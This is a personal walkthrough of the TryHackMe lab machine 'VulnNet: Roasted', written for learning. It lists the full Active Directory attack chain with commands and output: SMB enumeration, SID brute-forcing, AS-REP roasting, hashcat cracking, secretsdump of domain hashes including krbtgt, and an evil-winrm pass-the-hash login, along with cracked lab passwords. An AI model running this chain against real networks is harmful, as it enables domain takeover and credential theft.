# VulnNet: Roasted

This is my write-up for the machine on TryHackMe known as **VulnNet: Roasted**: [https://tryhackme.com/room/vulnnetroasted](https://tryhackme.com/room/vulnnetroasted)

I am going to start off my running the following nmap scan: 

```c
nmap -T4 -A -vvv -Pn 10.10.146.147 -oN nmap.output
```

I then got the following result from the search:

```c
# Nmap 7.91 scan initiated Sat Jul 24 15:18:10 2021 as: nmap -T4 -A -vvv -Pn -oN nmap.output 10.10.146.147
Increasing send delay for 10.10.146.147 from 0 to 5 due to 25 out of 62 dropped probes since last increase.
Nmap scan report for 10.10.146.147
Host is up, received user-set (0.16s latency).
Scanned at 2021-07-24 15:18:11 EDT for 69s
Not shown: 995 closed ports
Reason: 995 conn-refused
PORT     STATE    SERVICE        REASON      VERSION
135/tcp  filtered msrpc          no-response
139/tcp  filtered netbios-ssn    no-response
593/tcp  filtered http-rpc-epmap no-response
636/tcp  filtered ldapssl        no-response
3389/tcp filtered ms-wbt-server  no-response

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jul 24 15:19:20 2021 -- 1 IP address (1 host up) scanned in 70.18 seconds
```

My next step was to look at what each of the ports have on them using the browser. I was getting this message: 

![](<../../.gitbook/assets/image (162).png>)

I looked at [this write-up](https://github.com/siddicky/vulnnet_roasted/blob/main/README.md) to compare the results for nmap, and changed my search to be the following:

```c
nmap -T5 -sV -sC -T4 -Pn 10.10.146.147
```

I then got a different result:

```c
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-07-24 15:23 EDT
Nmap scan report for 10.10.146.147
Host is up (0.17s latency).
Not shown: 990 filtered ports
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-07-24 19:24:08Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: vulnnet-rst.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: WIN-2BO8M1OE1M1; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: -11s
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2021-07-24T19:24:27
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.05 seconds
```

Running **smbmap **(an idea I got from the write-up mentioned previously) on the IP address got me the following result:

![](<../../.gitbook/assets/image (160).png>)

I then looked on **book.hacktricks.xyz** to see what the author would do in this case. I ended up using [this site](https://book.hacktricks.xyz/pentesting/pentesting-smb#download-files) to connect to the SMB share with the following command:

```c
smbclient //10.10.146.147/VulnNet-Business-Anonymous
```

I then got this output:

![](<../../.gitbook/assets/image (156).png>)

I then downloaded those files using **mget \***:

![](<../../.gitbook/assets/image (161).png>)

I did see a couple names in the files, which could potentially be usernames we can exploit later: 

![](<../../.gitbook/assets/image (157).png>)

I then downloaded the other files from the other share:

![](<../../.gitbook/assets/image (154).png>)

There were names that stood out on these files as well:

![](<../../.gitbook/assets/image (158).png>)

I then wanted to know where I would go from here. Viewing the **book.hacktricks.xyz** site from before I realized that I would have to bruteforce SIDs. I used the Metasploit version (this takes 5-10 minutes):

```c
msf6 > use auxiliary/scanner/smb/smb_lookupsid
msf6 auxiliary(scanner/smb/smb_lookupsid) > set rhosts 10.10.146.147
rhosts => 10.10.146.147
msf6 auxiliary(scanner/smb/smb_lookupsid) > run

[*] 10.10.146.147:445     - PIPE(LSARPC) LOCAL(VULNNET-RST - 5-21-1589833671-435344116-4136949213) DOMAIN(VULNNET-RST - 5-21-1589833671-435344116-4136949213)
[*] 10.10.146.147:445     - USER=Administrator RID=500
[*] 10.10.146.147:445     - USER=Guest RID=501
[*] 10.10.146.147:445     - USER=krbtgt RID=502
[*] 10.10.146.147:445     - GROUP=Domain Admins RID=512
[*] 10.10.146.147:445     - GROUP=Domain Users RID=513
[*] 10.10.146.147:445     - GROUP=Domain Guests RID=514
[*] 10.10.146.147:445     - GROUP=Domain Computers RID=515
[*] 10.10.146.147:445     - GROUP=Domain Controllers RID=516
[*] 10.10.146.147:445     - TYPE=4 NAME=Cert Publishers rid=517
[*] 10.10.146.147:445     - GROUP=Schema Admins RID=518
[*] 10.10.146.147:445     - GROUP=Enterprise Admins RID=519
[*] 10.10.146.147:445     - GROUP=Group Policy Creator Owners RID=520
[*] 10.10.146.147:445     - GROUP=Read-only Domain Controllers RID=521
[*] 10.10.146.147:445     - GROUP=Cloneable Domain Controllers RID=522
[*] 10.10.146.147:445     - GROUP=Protected Users RID=525
[*] 10.10.146.147:445     - GROUP=Key Admins RID=526
[*] 10.10.146.147:445     - GROUP=Enterprise Key Admins RID=527
[*] 10.10.146.147:445     - TYPE=4 NAME=RAS and IAS Servers rid=553
[*] 10.10.146.147:445     - TYPE=4 NAME=Allowed RODC Password Replication Group rid=571
[*] 10.10.146.147:445     - TYPE=4 NAME=Denied RODC Password Replication Group rid=572
[*] 10.10.146.147:445     - USER=WIN-2BO8M1OE1M1$ RID=1000
[*] 10.10.146.147:445     - TYPE=4 NAME=DnsAdmins rid=1101
[*] 10.10.146.147:445     - GROUP=DnsUpdateProxy RID=1102
[*] 10.10.146.147:445     - USER=enterprise-core-vn RID=1104
[*] 10.10.146.147:445     - USER=a-whitehat RID=1105
[*] 10.10.146.147:445     - USER=t-skid RID=1109
[*] 10.10.146.147:445     - USER=j-goldenhand RID=1110
[*] 10.10.146.147:445     - USER=j-leet RID=1111
```

I then copied that into a file, and then ran **grep** on it to just print the list of the users only:

![](<../../.gitbook/assets/image (151).png>)

For some reason, the **Impacket** download on my Kali Linux machine was lacking a lot of scripts. I then cloned the following repository: [https://github.com/SecureAuthCorp/impacket](https://github.com/SecureAuthCorp/impacket). I noticed a couple write-ups referring to **GetNPUsers.py**, and so I decided to give that a try as well. I ran the following command to try to get hashes from the Users:

```c
python3 ../resources/impacket/examples/GetNPUsers.py -dc-ip 10.10.1.76  -usersfile user.txt vulnnet-rst.local/ 
```

In the previous command, the **vulnnet-rst.local** was the IP address of the machine. I had just changed that in **/etc/hosts**. I got the following result:

```c
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User Guest doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User WIN-2BO8M1OE1M1$ doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User enterprise-core-vn doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User a-whitehat doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$t-skid@VULNNET-RST.LOCAL:2e6e96f256650a147b730f5166f96dcc$ed8ede7f521badccabd77c10788c626f4dbd4457859707decb0e9795b3c3c97644a340d45e203a9ee96b097569174cc01255e5a69d1d9b3b5da3aaf8f61647e404f1543d63dbc1450f99c16848407a211a6045dfae0290745aeee5a7a3fea7669ed7fdd27ca05c1ba919a44b9d34f58fd18f12290b91b51fa508affbf037a90bf33aa14ef23f6d9caf2a8047823a0fd60df148ba2101e329b9c0b359cd7f74199fb51d97de224b4f1215400d76a9b59a0d04e4a59226ef904bd0c7946186010280f7a2bcf4262ffd9f5050c793ba5697f14308efb85d5e6b338ee2318b30046345cd236db3e3837f018218450303fafba1a32a7ad26a
[-] User j-goldenhand doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User j-leet doesn't have UF_DONT_REQUIRE_PREAUTH set
```

I then realized that I would have to crack the hash in the output. My assumption is that this is a kerberos hash. Looking on [https://hashcat.net/wiki/doku.php?id=example_hashes](https://hashcat.net/wiki/doku.php?id=example_hashes), I found out that this is Kerberos 5, and the mode for this is **18200**. I then tried to crack this using hashcat:

```c
hashcat -m 18200 hash ../resources/rockyou.txt --force
```

The hash was then cracked:

![](<../../.gitbook/assets/image (152).png>)

I then plugged that information into **smbmap**:

```c
┌──(kali㉿kali)-[~/Desktop/hacking/working]
└─$ smbmap -H 10.10.60.75 -u t-skid -p 'tj072889*'
[+] IP: 10.10.60.75:445 Name: 10.10.60.75                                       
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                READ ONLY       Logon server share 
        SYSVOL                                                  READ ONLY       Logon server share 
        VulnNet-Business-Anonymous                              READ ONLY       VulnNet Business Sharing
        VulnNet-Enterprise-Anonymous                            READ ONLY       VulnNet Enterprise Sharing
```

I noticed that there were more READ ONLY shares available from this user. I then wanted to see what those files were:

![](<../../.gitbook/assets/image (159).png>)

Viewing the .vbs file it showed me a username and password:

![](<../../.gitbook/assets/image (153).png>)

I then did smbmap using this username and password:

![](<../../.gitbook/assets/image (150).png>)

I first used **smbclient** to get into the C$ drive. After not finding anything for a while, I looked at this [write-up](https://muzec0318.github.io/posts/roasted.html). I then realized that I had to use **Impacket** again in order to get the other hashes for the other users. I first ran **crackmapexec**:

```c
┌──(kali㉿kali)-[~/Desktop/hacking/working]
└─$ crackmapexec smb 10.10.60.75 -u a-whitehat -p bNdKVkjv3RR9ht                 
SMB         10.10.60.75     445    WIN-2BO8M1OE1M1  [*] Windows 10.0 Build 17763 x64 (name:WIN-2BO8M1OE1M1) (domain:vulnnet-rst.local) (signing:True) (SMBv1:False)
SMB         10.10.60.75     445    WIN-2BO8M1OE1M1  [+] vulnnet-rst.local\a-whitehat:bNdKVkjv3RR9ht (Pwn3d!)
```

I then added the "pwned" share into the **secretsdump.py** command:

```c
└─$ python3 ../resources/impacket/examples/secretsdump.py vulnnet-rst.local/a-whitehat:bNdKVkjv3RR9ht@10.10.60.75
Impacket v0.9.24.dev1+20210720.100427.cd4fe47c - Copyright 2021 SecureAuth Corporation

[*] Service RemoteRegistry is in stopped state
[*] Starting service RemoteRegistry
[*] Target system bootKey: 0xf10a2788aef5f622149a41b2c745f49a
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
VULNNET-RST\WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:afb47c9c041aa76bdcec5092c06b64cd2cc7bb5cc33a22e4e0b9c5395a2de9ba
VULNNET-RST\WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:b7b6f8d5712f5421fddc8150b8905b09
VULNNET-RST\WIN-2BO8M1OE1M1$:des-cbc-md5:7a389e408f2ae931
VULNNET-RST\WIN-2BO8M1OE1M1$:plain_password_hex:e43bef613c95201a529587fef7e65e3fccc4c0d17fdb79f0893ade79035d0bf4183c53067a9ce3114034972380dfc4af6599d80e4582d38cd8c74529062211ff7f10bf5733e6536635c57c2f23b50e97ee81734c3f4442067354c1aad74a50ab7e61efd2d2394d6c16323659123140067e7caa831e846d354ba311e928626e5cad47d1c77510f6979eadf3c75bd44a8770fcf069ee73a3849641b4aaaae5a0e98768e7c1d65d237b567b5b6ceeeefb327e87a288e2a44ba2949e226dbd414309f61bf4c1356e8108de4da6cf0b0a9d58ed98ccd33ee9f4a0db90747461ecb08cc087bd3c81953f7e419621ec6c60671d
VULNNET-RST\WIN-2BO8M1OE1M1$:aad3b435b51404eeaad3b435b51404ee:bd3fbf565ec5fa78ae280aa4902e24cb:::
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x20809b3917494a0d3d5de6d6680c00dd718b1419
dpapi_userkey:0xbf8cce326ad7bdbb9bbd717c970b7400696d3855
[*] NL$KM 
 0000   F3 F6 6B 8D 1E 2A F4 8E  85 F6 7A 46 D1 25 A0 D3   ..k..*....zF.%..
 0010   EA F4 90 7D 2D CB A5 8C  88 C5 68 4C 1E D3 67 3B   ...}-.....hL..g;
 0020   DB 31 D9 91 C9 BB 6A 57  EA 18 2C 90 D3 06 F8 31   .1....jW..,....1
 0030   7C 8C 31 96 5E 53 5B 85  60 B4 D5 6B 47 61 85 4A   |.1.^S[.`..kGa.J
NL$KM:f3f66b8d1e2af48e85f67a46d125a0d3eaf4907d2dcba58c88c5684c1ed3673bdb31d991c9bb6a57ea182c90d306f8317c8c31965e535b8560b4d56b4761854a
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:c2597747aa5e43022a3a3049a3c3b09d:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:7633f01273fc92450b429d6067d1ca32:::
vulnnet-rst.local\enterprise-core-vn:1104:aad3b435b51404eeaad3b435b51404ee:8752ed9e26e6823754dce673de76ddaf:::
vulnnet-rst.local\a-whitehat:1105:aad3b435b51404eeaad3b435b51404ee:1bd408897141aa076d62e9bfc1a5956b:::
vulnnet-rst.local\t-skid:1109:aad3b435b51404eeaad3b435b51404ee:49840e8a32937578f8c55fdca55ac60b:::
vulnnet-rst.local\j-goldenhand:1110:aad3b435b51404eeaad3b435b51404ee:1b1565ec2b57b756b912b5dc36bc272a:::
vulnnet-rst.local\j-leet:1111:aad3b435b51404eeaad3b435b51404ee:605e5542d42ea181adeca1471027e022:::
WIN-2BO8M1OE1M1$:1000:aad3b435b51404eeaad3b435b51404ee:bd3fbf565ec5fa78ae280aa4902e24cb:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:7f9adcf2cb65ebb5babde6ec63e0c8165a982195415d81376d1f4ae45072ab83
Administrator:aes128-cts-hmac-sha1-96:d9d0cc6b879ca5b7cfa7633ffc81b849
Administrator:des-cbc-md5:52d325cb2acd8fc1
krbtgt:aes256-cts-hmac-sha1-96:a27160e8a53b1b151fa34f45524a07eb9899ebdf0051b20d677f0c3b518885bd
krbtgt:aes128-cts-hmac-sha1-96:75c22aac8f2b729a3a5acacec729e353
krbtgt:des-cbc-md5:1357f2e9d3bc0bd3
vulnnet-rst.local\enterprise-core-vn:aes256-cts-hmac-sha1-96:9da9e2e1e8b5093fb17b9a4492653ceab4d57a451bd41de36b7f6e06e91e98f3
vulnnet-rst.local\enterprise-core-vn:aes128-cts-hmac-sha1-96:47ca3e5209bc0a75b5622d20c4c81d46
vulnnet-rst.local\enterprise-core-vn:des-cbc-md5:200e0102ce868016
vulnnet-rst.local\a-whitehat:aes256-cts-hmac-sha1-96:f0858a267acc0a7170e8ee9a57168a0e1439dc0faf6bc0858a57687a504e4e4c
vulnnet-rst.local\a-whitehat:aes128-cts-hmac-sha1-96:3fafd145cdf36acaf1c0e3ca1d1c5c8d
vulnnet-rst.local\a-whitehat:des-cbc-md5:028032c2a8043ddf
vulnnet-rst.local\t-skid:aes256-cts-hmac-sha1-96:a7d2006d21285baee8e46454649f3bd4a1790c7f4be7dd0ce72360dc6c962032
vulnnet-rst.local\t-skid:aes128-cts-hmac-sha1-96:8bdfe91cca8b16d1b3b3fb6c02565d16
vulnnet-rst.local\t-skid:des-cbc-md5:25c2739dcb646bfd
vulnnet-rst.local\j-goldenhand:aes256-cts-hmac-sha1-96:fc08aeb44404f23ff98ebc3aba97242155060928425ec583a7f128a218e4c5ad
vulnnet-rst.local\j-goldenhand:aes128-cts-hmac-sha1-96:7d218a77c73d2ea643779ac9b125230a
vulnnet-rst.local\j-goldenhand:des-cbc-md5:c4e65d49feb63180
vulnnet-rst.local\j-leet:aes256-cts-hmac-sha1-96:1327c55f2fa5e4855d990962d24986b63921bd8a10c02e862653a0ac44319c62
vulnnet-rst.local\j-leet:aes128-cts-hmac-sha1-96:f5d92fe6dc0f8e823f229fab824c1aa9
vulnnet-rst.local\j-leet:des-cbc-md5:0815580254a49854
WIN-2BO8M1OE1M1$:aes256-cts-hmac-sha1-96:afb47c9c041aa76bdcec5092c06b64cd2cc7bb5cc33a22e4e0b9c5395a2de9ba
WIN-2BO8M1OE1M1$:aes128-cts-hmac-sha1-96:b7b6f8d5712f5421fddc8150b8905b09
WIN-2BO8M1OE1M1$:des-cbc-md5:08df516ee67c4aad
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
[-] SCMR SessionError: code: 0x41b - ERROR_DEPENDENT_SERVICES_RUNNING - A stop control has been sent to a service that other running services are dependent on.
[*] Cleaning up... 
[*] Stopping service RemoteRegistry
```

Using the same write-up I learned about [**evil-winrm**](https://github.com/Hackplayers/evil-winrm). I then used that to try to get a foothold into the machine:

```c
evil-winrm -i 10.10.60.75 -u administrator -H c2597747aa5e43022a3a3049a3c3b09d
```

I then got into the machine! When I looked into the **C:\Users\Administrator\Desktop** I found the **system.txt** file. I then realized, that I had to look for the **user.txt** file next. I found the **user.txt** file in **C:\Users\enterprise-core-vn\Desktop**. I then had both flags:

![](<../../.gitbook/assets/image (155).png>)
